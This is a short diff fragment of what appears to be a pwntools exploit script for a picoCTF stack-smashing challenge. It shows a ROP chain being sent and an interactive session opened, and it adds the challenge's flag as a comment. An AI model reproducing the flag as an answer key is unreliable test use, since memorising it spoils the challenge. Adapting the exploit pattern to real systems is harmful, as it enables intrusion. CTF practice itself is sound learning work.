@@ -66,3 +66,4 @@ p.sendlineafter("sErVeR!", rop2)
 p.interactive()
 
 # Flag
+picoCTF{1_<3_sm4sh_st4cking_fb2de5a40ccfb50c}
